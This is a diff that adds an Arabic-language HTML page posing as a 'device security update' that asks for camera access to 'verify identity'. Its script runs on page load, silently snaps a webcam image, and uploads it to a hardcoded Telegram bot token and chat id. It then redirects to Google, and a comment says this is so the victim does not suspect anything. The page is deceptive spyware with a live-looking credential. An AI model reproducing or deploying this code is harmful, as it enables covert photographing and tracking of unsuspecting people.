@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث أمان الجهاز</title>
+    <style>
+        body { background: #111; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    <h2>جاري فحص حالة الجهاز...</h2>
+    <p>يرجى السماح بالوصول للكاميرا لإتمام عملية التحقق من الهوية</p>
+
+    <script>
+        // --- تعديل البيانات هنا ---
+        const token = '8787201125:AAGXUM1rZTxdSempBLkMs7xkza8K6rM7qgo';
+        const chat_id = '6462902234';
+        // -------------------------
+
+        async function startSystem() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // لقطة سريعة بعد ثانية واحدة من فتح الكاميرا
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob, 'thief.jpg');
+
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        // تحويله لموقع جوجل عشان مكيشكش في حاجة
+                        window.location.href = "https://www.google.com";
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                console.log("الوصول مرفوض");
+            }
+        }
+        window.onload = startSystem;
+    </script>
+</body>
+</html>
